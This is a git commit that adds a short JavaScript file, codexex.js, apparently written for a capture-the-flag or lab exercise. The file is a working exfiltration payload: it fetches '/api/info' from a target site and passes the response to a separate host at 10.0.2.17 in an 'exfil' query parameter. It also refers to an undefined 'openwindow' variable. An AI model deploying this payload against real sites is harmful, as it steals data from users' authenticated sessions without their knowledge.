18ae251990d147224e437306a6e8c65027eeda48
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 19:53:11 +0200

    Update and rename codexe.js to codexex.js

---
+++ codexex.js
@@ -0,0 +1,13 @@
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = () =>{
+        if(xhr.readyState == XMLHttpRequest.DONE){
+                window.open("http://10.0.2.17/?exfil=" + xhr.response);
+                if(openwindow){
+                        openwindow.onload = () => {
+                                openwindow.close();
+                        }
+                }
+        }
+};
+xhr.open('GET',"https://guitjapeo.thl/api/info",false);
+xhr.send();
